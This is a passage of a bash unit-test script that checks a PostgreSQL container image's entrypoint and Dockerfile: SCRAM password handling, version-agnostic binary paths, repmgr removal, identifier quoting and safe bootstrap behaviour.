#!/bin/bash
# Unit tests for the bash logic shipped in the repmgr image. No cluster needed.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
fail=0
ok()   { echo "PASS: $1"; }
# $2 is the optional detail line (what was expected vs seen); printing it is the whole
# point of passing it, and it was being dropped (#298 review). Same shape as image-smoke.sh.
bad()  { echo "FAIL: $1"; [ -n "${2:-}" ] && echo "      $2"; fail=1; }

# --- syntax check every shipped script ---
for s in entrypoint.sh pg-common.sh; do
  if bash -n "${ROOT}/${s}" 2>/dev/null; then ok "bash -n ${s}"; else bad "bash -n ${s}"; fi
done

# --- managed users (postgres, repmgr) must be created with a SCRAM secret ---
# #298: initdb must not request md5. --auth-host writes password_encryption into
# postgresql.conf, so md5 there meant every password stored on a brand-new cluster afterwards --
# an operator's CREATE USER, the databases-roles Job's roles -- defaulted to a hash deprecated
# since PostgreSQL 10, and the chart's own md5->scram migration existed to undo it.
if grep -qE 'initdb .*--auth-host=scram-sha-256' "${ROOT}/entrypoint.sh"; then
  ok "#298: initdb requests scram-sha-256 for host auth"
else
  bad "#298: initdb does not request scram-sha-256" "$(grep -n 'initdb -D' "${ROOT}/entrypoint.sh")"
fi
if grep -qE 'initdb .*--auth-host=md5' "${ROOT}/entrypoint.sh"; then
  bad "#298: initdb still requests md5 host auth"
else
  ok "#298: initdb requests no md5 host auth"
fi

# The per-statement SET is kept as belt-and-braces even though it now agrees with the default:
# pg_hba requires
# scram-sha-256 for the pod network -- so a bare CREATE USER stores an MD5 secret
# that the scram rule rejects ("does not have a valid SCRAM secret"), a startup
# race that wedges repmgrd / the standby clone. The CREATE/ALTER USER for the
# managed users must force scram-sha-256 in-session.
# The password-bearing CREATE/ALTER USER go in on STDIN now (#298 security review), so the
# SET and the CREATE share a heredoc rather than one -c string. Each heredoc opens with the
# SET, so grep a few lines of context from the opener and assert both appear together.
scram_block=$(grep -A3 'psql -U postgres -d postgres 2>/dev/null <<SQL' "${ROOT}/entrypoint.sh")
if printf '%s' "${scram_block}" | grep -q "password_encryption='scram-sha-256'" \
   && printf '%s' "${scram_block}" | grep -qE 'CREATE USER "\$\{repmgr_user_id\}"'; then
  ok "entrypoint.sh creates the repmgr user with a SCRAM secret"
else
  bad "entrypoint.sh creates the repmgr user with a SCRAM secret"
fi
if printf '%s' "${scram_block}" | grep -q "password_encryption='scram-sha-256'" \
   && printf '%s' "${scram_block}" | grep -qE 'CREATE USER "\$\{pg_user_id\}"'; then
  ok "entrypoint.sh creates the postgres user with a SCRAM secret"
else
  bad "entrypoint.sh creates the postgres user with a SCRAM secret"
fi
# The passwords must NOT be on a psql argv (#298 security review): a `-c "... PASSWORD ..."`
# leaks them via /proc/<pid>/cmdline. Assert no CREATE/ALTER USER carries PASSWORD on a -c line.
if grep -E 'psql .*-c .*(CREATE|ALTER) USER' "${ROOT}/entrypoint.sh" | grep -q 'PASSWORD'; then
  bad "#298: a managed-user password is still passed on the psql command line (visible in /proc)"
else
  ok "#298: managed-user passwords are fed on stdin, not the psql command line"
fi

# --- agent failover mode: entrypoint dispatches "agent" -> pg-ha-agent ---
if grep -qF '"postgres"|"agent")' "${ROOT}/entrypoint.sh" && grep -qF 'exec /usr/local/bin/pg-ha-agent' "${ROOT}/entrypoint.sh"; then
  ok "entrypoint dispatches agent mode to pg-ha-agent"
else
  bad "entrypoint does not dispatch agent mode to pg-ha-agent"
fi

# --- #269: the PG major must not be hardcoded anywhere in the shipped shell layer ---
# The whole point of the PG_MAJOR build arg is that one image build can be PG17 or PG18.
# A single re-hardcoded /usr/lib/postgresql/<major>/bin would send a PG17 image at a
# bindir that does not exist -- so scan every shipped file rather than the ones that
# happened to need fixing.
# repmgr.conf was in this list until #290 deleted it. `2>/dev/null || true` meant grep's
# exit-2 for the missing file was swallowed, so the scan silently covered one file fewer than
# the assertion claimed -- and would equally have hidden a real grep failure.
hardcoded=$(grep -rn '/usr/lib/postgresql/1[0-9]' \
  "${ROOT}"/*.sh "${ROOT}/Dockerfile" 2>/dev/null || true)
if [ -z "$hardcoded" ]; then
  ok "#269: no hardcoded versioned bindir in the shipped scripts or Dockerfile"
else
  bad "#269: hardcoded versioned bindir found" "$hardcoded"
fi

# --- #269: PG_BINDIR is defined once, in the shared helper ---
if grep -qE '^PG_BINDIR="/usr/lib/postgresql/\$\{PG_MAJOR\}/bin"$' "${ROOT}/pg-common.sh" \
   && grep -qE '^PG_MAJOR="\$\{PG_MAJOR:-18\}"$' "${ROOT}/pg-common.sh"; then
  ok "#269/#290: pg-common.sh derives PG_BINDIR from PG_MAJOR (default 18)"
else
  bad "#269/#290: pg-common.sh does not define PG_MAJOR/PG_BINDIR as expected"
fi

# --- #269: require_pg_bindir refuses a major the image does not bundle ---
# The chart passes PG_MAJOR from repmgr.image.majorVersion, so this function is where a
# values file asking for a major the image was not built with stops. Behavioral, not
# structural: a bogus major must fail and the message must name both sides, because the
# alternative failure mode is an empty PATH element and a confusing "initdb: not found".
bogus=$( PG_MAJOR=999 bash -c 'source '"${ROOT}"'/pg-common.sh; require_pg_bindir' 2>&1 )
bogus_rc=$?
if [ "$bogus_rc" -ne 0 ]; then
  ok "#269: require_pg_bindir fails for a major the image does not bundle"
else
  bad "#269: require_pg_bindir accepted PG_MAJOR=999"
fi
if grep -q 'PG_MAJOR=999' <<<"$bogus" && grep -qi 'majorVersion' <<<"$bogus"; then
  ok "#269: require_pg_bindir names the requested major and the values to fix"
else
  bad "#269: require_pg_bindir message is not actionable" "$bogus"
fi

# The entrypoint must CALL it -- an unused guard is no guard. One script, not two: the major
# check lives in the entrypoint's own `init` mode (#290).
if grep -q 'require_pg_bindir' "${ROOT}/entrypoint.sh"; then
  ok "#269: entrypoint.sh calls require_pg_bindir"
else
  bad "#269: entrypoint.sh does not call require_pg_bindir"
fi

# --- #269/#290: the ARG default must stay in step with the documented default major ---
# There is no unsuffixed tag and every publish leg passes
# --build-arg explicitly, so nothing PUBLISHED depends on it -- but it still decides what a bare
# `docker build` and an env-less runtime get, and the docs name 18, so the two must agree.
if grep -qE '^ARG PG_MAJOR=18$' "${ROOT}/Dockerfile"; then
  ok "#269: Dockerfile defaults ARG PG_MAJOR to 18"
else
  bad "#269: Dockerfile ARG PG_MAJOR default is not 18"
fi

# --- #269: the major must reach the runtime as an ENV ---
# The shell layer and the Go agent both read PG_MAJOR from the container env; without
# this ENV a PG17 build would fall back to the 18 default at runtime.
if grep -qE '^ENV PG_MAJOR=\$\{PG_MAJOR\}$' "${ROOT}/Dockerfile"; then
  ok "#269: Dockerfile exports PG_MAJOR to the runtime env"
else
  bad "#269: Dockerfile does not export PG_MAJOR as an ENV"
fi

# --- #269: per-major packages are checked for a candidate before install ---
# A missing postgresql-<major>-pgaudit must fail the BUILD; discovered at runtime it
# would mean audit.enabled=true produces silently absent audit logs.
if grep -qF 'apt-cache policy' "${ROOT}/Dockerfile" \
   && grep -qF 'postgresql-${PG_MAJOR}-pgaudit' "${ROOT}/Dockerfile"; then
  ok "#269: Dockerfile asserts per-major package availability before install"
else
  bad "#269: Dockerfile does not assert per-major package availability"
fi

# --- #288: initdb has exactly ONE call site, and native must not reach it inline ---
# The regression this guards: the init container does not clone, so an inline initdb on any
# empty PGDATA means every pod creates its own cluster with its own
# system_identifier -- and assertSameCluster (invariant 9) then refuses to rejoin any of them,
# so pods sit Running-but-never-Ready holding bogus databases. Strictly worse than the
# Init:CrashLoopBackOff it replaced.
# bootstrap_initdb's body, captured ONCE for the greps below. Not `sed ... | grep -q` per
# check (#298 review): with `pipefail`, `grep -q` exits on its first match while sed keeps
# writing, so once the function outgrows the pipe buffer sed takes SIGPIPE and the pipeline
# reports failure even though the pattern matched -- an assertion that inverts itself purely
# because the function got longer. The body is ~15KB against a 64KB buffer today, so nothing
# fails yet; a here-string takes the pipeline out of the picture entirely instead of relying
# on that margin holding.
_bi_body=$(sed -n '/^bootstrap_initdb() {/,/^}/p' "${ROOT}/entrypoint.sh")

# COMMENTS EXCLUDED (#298 review): this counted every occurrence of the string, so a comment
# that merely mentions the command failed the gate -- an assertion about call sites has to
# count code.
_initdb_sites=$(grep -v '^[[:space:]]*#' "${ROOT}/entrypoint.sh" | grep -c 'initdb -D')
if [ "${_initdb_sites}" = "1" ]; then
  ok "#288: initdb has exactly one call site"
else
  bad "#288: initdb has ${_initdb_sites} call sites; it must live only in bootstrap_initdb"
fi
if grep -q 'initdb -D' <<<"${_bi_body}"; then
  ok "#288: the initdb call site is inside bootstrap_initdb"
else
  bad "#288: initdb is not inside bootstrap_initdb"
fi
# The function must refuse to touch a populated data directory, whichever caller invokes it.
if grep -q 'if \[ -s "$PGDATA/PG_VERSION" \]' <<<"${_bi_body}"; then
  ok "#288: bootstrap_initdb no-ops on an existing data directory"
else
  bad "#288: bootstrap_initdb would initdb over existing data"
fi
# Behavioural, against the SHIPPED function rather than a hand-copied expression: source it
# out of the script and drive it with stubs, both ways round.
_bi_tmp=$(mktemp -d)
mkdir -p "${_bi_tmp}/pgdata"
echo 18 > "${_bi_tmp}/pgdata/PG_VERSION"
_bi_out=$(PGDATA="${_bi_tmp}/pgdata" POSTGRES_PASSWORD=x REPMGR_PASSWORD=y bash -c '
  source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
  initdb() { echo INITDB-RAN; }; pg_ctl() { :; }; psql() { :; }
  bootstrap_initdb 2>/dev/null' || true)
if printf '%s' "${_bi_out}" | grep -q INITDB-RAN; then
  bad "#288: bootstrap_initdb ran initdb over a populated PGDATA"
else
  ok "#288: bootstrap_initdb skipped a populated PGDATA (behavioural)"
fi
rm -f "${_bi_tmp}/pgdata/PG_VERSION"
_bi_out=$(PGDATA="${_bi_tmp}/pgdata" POSTGRES_PASSWORD=x REPMGR_PASSWORD=y bash -c '
  source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
  initdb() { echo INITDB-RAN; }; pg_ctl() { :; }; psql() { :; }
  bootstrap_initdb 2>/dev/null' || true)
if printf '%s' "${_bi_out}" | grep -q INITDB-RAN; then
  ok "#288: bootstrap_initdb initdbs an empty PGDATA (behavioural)"
else
  bad "#288: bootstrap_initdb did not initdb an empty PGDATA"
fi
rm -rf "${_bi_tmp}"
# The agent invokes it through a dispatch mode, so that mode must exist and be advertised.
if grep -q '"initdb")' "${ROOT}/entrypoint.sh"; then
  ok "#288: entrypoint.sh has an initdb dispatch mode for the agent"
else
  bad "#288: no initdb dispatch mode; the agent cannot bootstrap the lease holder"
fi
if grep -q 'postgres|agent|init|initdb' "${ROOT}/entrypoint.sh"; then
  ok "#288: the usage string lists the initdb mode"
else
  bad "#288: the usage string does not list the initdb mode"
fi

# --- #288: the transient bootstrap postmaster must not be network-reachable ---
# Between CREATE USER ${REPMGR_USER} and the stop at the end of bootstrap_initdb it would
# otherwise be a reachable, authenticable primary reporting pg_is_in_recovery()=false -- and
# under native a non-holder's next tick would BootstrapClone from it, inheriting the legacy
# `host all all 0.0.0.0/0` pg_hba for the pod's whole life (nothing on the clone path
# rewrites pg_hba) plus a postgresql.conf with no include_dir.
if grep -q "listen_addresses=''" <<<"${_bi_body}"; then
  ok "#288: the bootstrap postmaster listens on no TCP address"
else
  bad "#288: the bootstrap postmaster is network-reachable during role creation"
fi

# #298 review: the bootstrap pg_hba must not offer md5 to the network. It only ever runs on an
# empty PGDATA whose roles are created with password_encryption='scram-sha-256', so an md5 rule
# bought no compatibility (PostgreSQL uses SCRAM anyway when the stored secret is a verifier)
# while advertising a deprecated method -- and in `postgres` mode nothing ever rewrites it.
if grep -qE '^host.*[[:space:]]md5[[:space:]]*$' <<<"${_bi_body}"; then
  bad "#298: bootstrap_initdb still writes an md5 host rule" "$(grep -E '^host.*md5' <<<"${_bi_body}")"
else
  ok "#298: the bootstrap pg_hba offers no md5 host rule"
fi
if [ "$(grep -cE "^host[[:space:]]+(all|replication)[[:space:]]+all[[:space:]]+0\.0\.0\.0/0[[:space:]]+scram-sha-256$" <<<"${_bi_body}")" = "2" ]; then
  ok "#298: both bootstrap catch-all rules require scram-sha-256"
else
  bad "#298: the bootstrap catch-all rules are not both scram-sha-256"
fi

# --- #288: bootstrap_initdb's completion sentinel is written LAST ---
# The agent pairs an in-progress marker beside PGDATA with this sentinel inside it: marker
# present and sentinel absent means the bootstrap was killed partway (the kubelet can do this --
# the transient `pg_ctl start` satisfies the chart's startupProbe while the agent is inside the
# exec and not beating /healthz) and the directory must be discarded. That inference only holds
# if the sentinel is written after the LAST thing the bootstrap does, so a half-bootstrapped
# directory can never carry it.
sentinel_line=$(grep -n 'pg-ha-bootstrap-complete' "${ROOT}/entrypoint.sh" | head -1 | cut -d: -f1)
if [ -z "$sentinel_line" ]; then
  bad "#288: bootstrap_initdb writes no completion sentinel (the agent cannot tell a torn bootstrap from a finished one)"
else
  ok "#288: bootstrap_initdb writes a completion sentinel"
  # Every step of the bootstrap must precede it: the role/database psql calls and the stop.
  last_step=$(grep -nE 'CREATE USER .."\$\{repmgr_user_id\}|pg_ctl -D "\$PGDATA" -w stop' "${ROOT}/entrypoint.sh" | tail -1 | cut -d: -f1)
  if [ -n "$last_step" ] && [ "$sentinel_line" -gt "$last_step" ]; then
    ok "#288: the completion sentinel is written after the bootstrap's last step"
  else
    bad "#288: the completion sentinel is not last (sentinel=${sentinel_line}, last step=${last_step:-none}); a killed bootstrap could carry it"
  fi
fi

# --- #303 follow-up: conf.d must be wired in before the FIRST pg_ctl start ---
# shared_preload_libraries is postmaster-only (no reload). The chart's merged value
# (operator extras/pgaudit) lives in conf.d, and the chart's postStart hook alone would
# splice in the include_dir line only after postgres is already accepting
# connections -- too late for a postmaster-only GUC, and nothing forces a
# second restart on a fresh `helm install` (the config-checksum rolling restart only
# helps a later `helm upgrade`). entrypoint.sh must wire it in at initdb time,
# before its own bootstrap pg_ctl start below, so the merged preload list is active
# from the very first postmaster start.
confd_line=$(grep -n "include_dir = '/etc/postgresql/conf.d'" "${ROOT}/entrypoint.sh" | grep -v "PGDATA\"" | head -1 | cut -d: -f1)
guard_line=$(grep -n "if \[ -d /etc/postgresql/conf.d \]; then" "${ROOT}/entrypoint.sh" | head -1 | cut -d: -f1)
first_start_line=$(grep -n 'pg_ctl -D "\$PGDATA" -w start' "${ROOT}/entrypoint.sh" | head -1 | cut -d: -f1)
if [ -n "$guard_line" ] && [ -n "$confd_line" ]; then
  ok "#303: entrypoint.sh guards the conf.d include on the mount actually existing"
else
  bad "#303: entrypoint.sh does not guard the conf.d include on the mount existing"
fi
if [ -n "$confd_line" ] && [ -n "$first_start_line" ] && [ "$confd_line" -lt "$first_start_line" ]; then
  ok "#303: entrypoint.sh wires conf.d in before the bootstrap pg_ctl start"
else
  bad "#303: entrypoint.sh does not wire conf.d in before the bootstrap pg_ctl start"
fi

# --- #290: the image is repmgr-free, and stays that way ---
# Structural guards on the shipped layer. The runtime proof (`docker run <image> repmgr`
# failing, no repmgr.so, no repmgr user or dirs) belongs to the image-smoke test; these are
# what catch a re-introduction in review, before anything is built.

# No shipped script may invoke the repmgr CLI. Comments are excluded: several of them cite
# the deleted commands to explain what the agent replaced.
cli_hits=0
for s in entrypoint.sh pg-common.sh; do
  n=$(grep -vE '^[[:space:]]*#' "${ROOT}/${s}" | grep -cE '(^|[^[:alnum:]_])repmgr[[:space:]]+(standby|node|primary|cluster|service|daemon)([[:space:]]|$)' || true)
  cli_hits=$((cli_hits + n))
done
if [ "$cli_hits" -eq 0 ]; then
  ok "#290: no shipped script invokes the repmgr CLI"
else
  bad "#290: a shipped script still invokes the repmgr CLI (${cli_hits} occurrence(s))"
fi

# The deleted files must stay deleted.
for gone in init-repmgr.sh repmgr-common.sh repmgr.conf; do
  if [ -e "${ROOT}/${gone}" ]; then
    bad "#290: ${gone} is back; its work belongs to the agent"
  else
    ok "#290: ${gone} is gone"
  fi
done

# The Dockerfile must not reinstall the package or recreate the user/dirs/config. Comment
# lines are skipped -- the file explains what was removed and why.
df=$(grep -vE '^[[:space:]]*#' "${ROOT}/Dockerfile")
for pat in 'postgresql-\$\{PG_MAJOR\}-repmgr' 'useradd .*repmgr' '/etc/repmgr' '/var/log/repmgr' 'repmgr\.conf'; do
  if grep -qE "$pat" <<<"$df"; then
    bad "#290: Dockerfile still references ${pat}"
  else
    ok "#290: Dockerfile has no ${pat}"
  fi
done

# The entrypoint must not write the repmgr preload GUC. #293 exists because this line, once
# written, is baked into PGDATA and cloned to every standby -- so re-adding it here would
# silently make every new cluster unstartable on this image.
if grep -vE '^[[:space:]]*#' "${ROOT}/entrypoint.sh" | grep -qE "shared_preload_libraries[[:space:]]*=[[:space:]]*'repmgr'"; then
  bad "#290/#293: entrypoint.sh writes the repmgr preload GUC into PGDATA"
else
  ok "#290/#293: entrypoint.sh writes no repmgr preload GUC"
fi

# ...nor create the extension. The repmgr DATABASE and ROLE are a different matter and must
# SURVIVE: the agent authenticates as that role for replication and names that database in
# primary_conninfo (renaming them is #291).
if grep -vE '^[[:space:]]*#' "${ROOT}/entrypoint.sh" | grep -q 'CREATE EXTENSION IF NOT EXISTS repmgr'; then
  bad "#290: entrypoint.sh still creates the repmgr extension"
else
  ok "#290: entrypoint.sh does not create the repmgr extension"
fi
# CREATE DATABASE stays a -c call (no secret), so it keeps the \"...\" shell escaping;
# CREATE USER moved into a stdin heredoc (#298), where the quotes are literal.
for keep in 'CREATE DATABASE \"${repmgr_db_id}\"' 'CREATE USER "${repmgr_user_id}"'; do
  if grep -qF "$keep" "${ROOT}/entrypoint.sh"; then
    ok "#290: still creates ${keep} (native needs the role and database for replication auth)"
  else
    bad "#290: ${keep} was removed; the agent cannot authenticate for replication without it"
  fi
done

# `init` mode must be the cheap major check, not a bootstrap: no clone, no registration poll.
init_block=$(sed -n '/^    "init")/,/^        ;;/p' "${ROOT}/entrypoint.sh")
if grep -q 'require_pg_bindir' <<<"$init_block" && grep -q 'exit 0' <<<"$init_block"; then
  ok "#290: init mode checks the PG major and exits 0"
else
  bad "#290: init mode is not the reduced major check"
fi
if grep -vE '^[[:space:]]*#' <<<"$init_block" | grep -qE 'pg_basebackup|repmgr|pg_ctl'; then
  bad "#290: init mode still does bootstrap work; the agent owns clone and initdb"
else
  ok "#290: init mode does no bootstrap work"
fi


# --- #290: bootstrap_initdb validates credentials BEFORE touching the volume ---
# Resolving them after starting the transient postmaster means `docker run <img> postgres`
# with neither set runs initdb, appends GUCs, starts a postmaster and only then dies on the
# unset-parameter check -- leaving PG_VERSION present, no completion sentinel, and
# a postmaster killed with the container. The next run then no-op'd the bootstrap and served a
# cluster with no application roles.
_cred_tmp=$(mktemp -d)
mkdir -p "${_cred_tmp}/pgdata"
_cred_out=$(PGDATA="${_cred_tmp}/pgdata" bash -c '
  source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
  initdb() { echo INITDB-RAN; }; pg_ctl() { echo PGCTL-RAN; }; psql() { :; }
  bootstrap_initdb' 2>&1 || true)
if printf '%s' "${_cred_out}" | grep -qE 'INITDB-RAN|PGCTL-RAN'; then
  bad "#290: bootstrap_initdb wrote to the volume before validating credentials" "${_cred_out}"
else
  ok "#290: bootstrap_initdb refuses before initdb when a password is unset"
fi
if printf '%s' "${_cred_out}" | grep -q 'POSTGRES_PASSWORD is required'; then
  ok "#290: the refusal names the missing variable"
else
  bad "#290: the refusal does not name the missing variable" "${_cred_out}"
fi
rm -rf "${_cred_tmp}"

# ...and an ALREADY-BOOTSTRAPPED directory must start WITHOUT them (#290 review, round 2). The
# first cut of the fix hoisted the checks above the emptiness guard, which broke the upstream
# postgres image contract: a password is required only on first init, so `docker start` on an
# existing volume (or a compose run with no .env) died on a cluster needing no bootstrap.
_done_tmp=$(mktemp -d)
mkdir -p "${_done_tmp}/pgdata"
echo 18 > "${_done_tmp}/pgdata/PG_VERSION"
_done_rc=0
PGDATA="${_done_tmp}/pgdata" bash -c '
  source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
  initdb() { echo INITDB-RAN; }; pg_ctl() { :; }; psql() { :; }
  bootstrap_initdb' >/dev/null 2>&1 || _done_rc=$?
if [ "${_done_rc}" -eq 0 ]; then
  ok "#290: an already-bootstrapped PGDATA starts with no passwords set"
else
  bad "#290: an already-bootstrapped PGDATA was refused without passwords (rc=${_done_rc})"
fi
rm -rf "${_done_tmp}"

# --- #298 review: bootstrap identifiers are QUOTED, and verified under the same case ---
# Unquoted, PostgreSQL folds an identifier to lower case: POSTGRES_USER=MyApp created role
# `myapp` while the verification asked pg_authid for rolname = 'MyApp', so the bootstrap could
# never pass -- it exited before the sentinel and the agent discarded and re-bootstrapped the
# fresh directory forever. Folding is wrong independently of the check, too: libpq sends
# `-U MyApp` verbatim and the server compares it exactly, so a folded role cannot be logged in
# as at all.
# CREATE DATABASE is still a -c call inside a double-quoted shell string, so the file
# literally contains \"${var}\". CREATE/ALTER USER moved into a stdin heredoc (#298 security
# review), where the identifier quotes are literal ("${var}", no backslashes). Either way the
# identifier must be QUOTED with its double-quote-escaped copy.
for pair in 'CREATE DATABASE:pg_db_id:esc' 'CREATE USER:pg_user_id:raw' 'ALTER USER:pg_user_id:raw' \
            'CREATE DATABASE:repmgr_db_id:esc' 'CREATE USER:repmgr_user_id:raw'; do
  stmt=${pair%%:*}; rest=${pair#*:}; var=${rest%%:*}; form=${rest##*:}
  if [ "$form" = "esc" ]; then
    needle="${stmt} "'\"'"\${${var}}"'\"'
  else
    needle="${stmt} "'"'"\${${var}}"'"'
  fi
  if grep -qF "$needle" "${ROOT}/entrypoint.sh"; then
    ok "#298: ${stmt} quotes its identifier (\${${var}})"
  else
    bad "#298: ${stmt} interpolates an UNQUOTED identifier; PostgreSQL would fold it to lower case"
  fi
done
# Nothing may interpolate the raw env vars into SQL -- those are the unescaped values. The
# CREATE/ALTER USER SQL is now on heredoc body lines, not `psql ...` lines, so scan every
# CREATE/ALTER/GRANT line (any prefix) for a raw name env var rather than only psql -c lines.
if grep -vE '^[[:space:]]*#' "${ROOT}/entrypoint.sh" \
     | grep -E '(CREATE|ALTER|GRANT).*(DATABASE|USER|PRIVILEGES)' \
     | grep -qE '\$\{(POSTGRES_USER|POSTGRES_DB|REPMGR_USER|REPMGR_DB)\}'; then
  bad "#298: a bootstrap SQL statement still interpolates a raw name env var instead of its escaped copy"
else
  ok "#298: bootstrap SQL uses only the escaped identifier/literal copies"
fi
# GRANT names both, and both must be quoted.
if grep -qF 'GRANT ALL PRIVILEGES ON DATABASE \"${repmgr_db_id}\" TO \"${repmgr_user_id}\"' "${ROOT}/entrypoint.sh"; then
  ok "#298: the repmgr GRANT quotes both identifiers"
else
  bad "#298: the repmgr GRANT does not quote both identifiers"
fi
# The verification queries compare the SAME names as string literals, so they need the
# single-quote-escaped copies rather than the raw env values.
for lit in pg_user_lit pg_db_lit repmgr_user_lit repmgr_db_lit; do
  if grep -qF "= '\${${lit}}'" "${ROOT}/entrypoint.sh"; then
    ok "#298: bootstrap verification compares \${${lit}} as an escaped literal"
  else
    bad "#298: bootstrap verification does not use the escaped literal \${${lit}}"
  fi
done
# End to end: an uppercase name must survive a bootstrap. Roles/databases are faked, but the
# SQL text the entrypoint would run is captured, so folding shows up as a lower-case identifier.
_q_tmp=$(mktemp -d)
mkdir -p "${_q_tmp}/pgdata"
_q_sql="${_q_tmp}/sql.log"
PGDATA="${_q_tmp}/pgdata" POSTGRES_USER=MyApp POSTGRES_DB=MyDB POSTGRES_PASSWORD=pw \
REPMGR_USER=RepMgr REPMGR_DB=RepMgrDB REPMGR_PASSWORD=pw Q_SQL="${_q_sql}" bash -c '
  source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
  initdb() { mkdir -p "$PGDATA"; echo 18 > "$PGDATA/PG_VERSION"; }
  pg_ctl() { :; }
  # Record every -c payload AND any heredoc on stdin (the password-bearing CREATE/ALTER USER
  # go in on stdin since #298), then answer the verification SELECTs affirmatively.
  psql() { local sql=""; while [ $# -gt 0 ]; do [ "$1" = "-c" ] && sql=$2; [ "$1" = "-tAc" ] && sql=$2; shift; done
           local stdin_sql; stdin_sql=$(cat)
           printf "%s\n" "$sql" "$stdin_sql" >> "$Q_SQL"; case "$sql" in SELECT*) echo 1;; esac; }
  bootstrap_initdb' </dev/null >/dev/null 2>&1 || true
if grep -qF 'CREATE USER "MyApp"' "${_q_sql}" 2>/dev/null && grep -qF 'CREATE USER "RepMgr"' "${_q_sql}" 2>/dev/null; then
  ok "#298: an uppercase POSTGRES_USER/REPMGR_USER keeps its case in the CREATE statements"
else
  bad "#298: an uppercase user name was folded (or no SQL captured)" "$(head -8 "${_q_sql}" 2>/dev/null)"
fi
if grep -qF "rolname = 'MyApp'" "${_q_sql}" 2>/dev/null; then
  ok "#298: verification asks for the same case it created"
else
  bad "#298: verification does not query the created case" "$(grep rolname "${_q_sql}" 2>/dev/null | head -3)"
fi
rm -rf "${_q_tmp}"

# --- #298 review: REPMGR_USER may not collide with POSTGRES_USER or the bootstrap superuser ---
# See bootstrap_initdb for why a collision is unrecoverable. The refusal has to come BEFORE
# initdb, so nothing has touched the volume.
for _collide in 'same' 'superuser'; do
  _c_tmp=$(mktemp -d)
  mkdir -p "${_c_tmp}/pgdata"
  if [ "${_collide}" = "same" ]; then _c_pg=shared; _c_rm=shared; else _c_pg=myapp; _c_rm=postgres; fi
  _c_rc=0
  PGDATA="${_c_tmp}/pgdata" POSTGRES_USER="${_c_pg}" POSTGRES_DB=app POSTGRES_PASSWORD=pw \
  REPMGR_USER="${_c_rm}" REPMGR_DB=repmgr REPMGR_PASSWORD=pw bash -c '
    source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
    initdb() { echo INITDB-RAN > "$PGDATA/ran"; }
    pg_ctl() { :; }; psql() { :; }
    bootstrap_initdb' >/dev/null 2>&1 || _c_rc=$?
  if [ "${_c_rc}" -ne 0 ] && [ ! -f "${_c_tmp}/pgdata/ran" ]; then
    ok "#298: a colliding REPMGR_USER (${_collide}) is refused before initdb runs"
  else
    bad "#298: a colliding REPMGR_USER (${_collide}) was accepted" "rc=${_c_rc} initdb-ran=$([ -f "${_c_tmp}/pgdata/ran" ] && echo yes || echo no)"
  fi
  rm -rf "${_c_tmp}"
done

# --- #298 review: the transient bootstrap postmaster is never left running ---
# `pg_ctl -w stop` fails on PGCTLTIMEOUT (60s) on a contended node, and bare under `set -e` that
# exited with the daemonized postmaster still holding this script's stdout -- which in agent mode
# is the pipe Cmd.Output reads to EOF, so act() keeps opMu and the reconcile loop stops beating
# until initdbBudget expires. Escalate to an immediate stop, then fail.
if grep -qF 'if ! pg_ctl -D "$PGDATA" -w stop; then' "${ROOT}/entrypoint.sh" &&
   grep -qF 'pg_ctl -D "$PGDATA" -m immediate -w stop || true' "${ROOT}/entrypoint.sh"; then
  ok "#298: a failed smart shutdown escalates to an immediate stop instead of orphaning the postmaster"
else
  bad "#298: bootstrap_initdb still runs a bare 'pg_ctl -w stop' under set -e"
fi


echo "----"


# --- #298 review: postgres mode must not seal in a torn bootstrap ---
# Behavioural, against the SHIPPED function: source bootstrap_or_discard_torn out of the script
# with a stub bootstrap_initdb that records whether it was asked to build a cluster, and drive
# the three states that matter. The seal-in this guards was invisible for exactly one reason --
# bootstrap_initdb returns 0 on an existing PGDATA, so the failure looked like success.
_bd_fn=$(sed -n '/^bootstrap_or_discard_torn() {/,/^}/p' "${ROOT}/entrypoint.sh")
_bd_run() { # $1=scenario dir setup already done; echoes "initdb=<yes|no> pgversion=<yes|no>"
  (
    set +e
    PGDATA="$1/pgdata"
    export PGDATA
    eval "${_bd_fn}"
    # Records whether it actually BUILT a cluster, not whether it was called: the real
    # bootstrap_initdb is invoked unconditionally and returns 0 on an existing PGDATA, and
    # mistaking that no-op for work is precisely how the seal-in stayed invisible.
    bootstrap_initdb() { if [ ! -s "$PGDATA/PG_VERSION" ]; then _bd_called=yes; mkdir -p "$PGDATA"; echo 18 > "$PGDATA/PG_VERSION"; : > "$PGDATA/.pg-ha-bootstrap-complete"; fi; }
    _bd_called=no
    bootstrap_or_discard_torn >/dev/null 2>&1
    echo "initdb=${_bd_called}"
  )
}

# 1. A TORN directory (PG_VERSION + in-progress marker + no sentinel) must be discarded and rebuilt.
_bd1=$(mktemp -d); mkdir -p "${_bd1}/pgdata"
echo 18 > "${_bd1}/pgdata/PG_VERSION"; echo "user data" > "${_bd1}/pgdata/torn-evidence"
: > "${_bd1}/.pg-ha-initdb-in-progress"
_bd1_out=$(_bd_run "${_bd1}")
if [ "${_bd1_out}" = "initdb=yes" ] && [ ! -f "${_bd1}/pgdata/torn-evidence" ] && [ -f "${_bd1}/pgdata/.pg-ha-bootstrap-complete" ]; then
  ok "#298: postgres mode discards a torn bootstrap and rebuilds it"
else
  bad "#298: a torn bootstrap sealed in" "${_bd1_out}; torn-evidence present=$([ -f "${_bd1}/pgdata/torn-evidence" ] && echo yes || echo no)"
fi

# 2. A COMPLETE directory must be left strictly alone -- no discard, no initdb.
_bd2=$(mktemp -d); mkdir -p "${_bd2}/pgdata"
echo 18 > "${_bd2}/pgdata/PG_VERSION"; echo "real data" > "${_bd2}/pgdata/user-table"
: > "${_bd2}/pgdata/.pg-ha-bootstrap-complete"; : > "${_bd2}/.pg-ha-initdb-in-progress"
_bd2_out=$(_bd_run "${_bd2}")
if [ "${_bd2_out}" = "initdb=no" ] && [ -f "${_bd2}/pgdata/user-table" ]; then
  ok "#298: a completed bootstrap is never discarded"
else
